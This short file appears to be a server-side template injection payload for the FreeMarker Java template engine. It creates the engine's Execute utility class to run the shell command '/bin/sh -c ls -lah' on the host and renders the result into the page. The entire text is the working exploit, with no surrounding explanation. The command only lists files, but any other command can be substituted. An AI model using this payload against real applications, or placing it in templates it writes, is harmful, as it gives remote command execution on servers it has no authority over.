<#assign word="freemarker.template.utility.Execute"?new()>

<#assign word2=word('/bin/sh -c ls -lah')>

${word2?string}
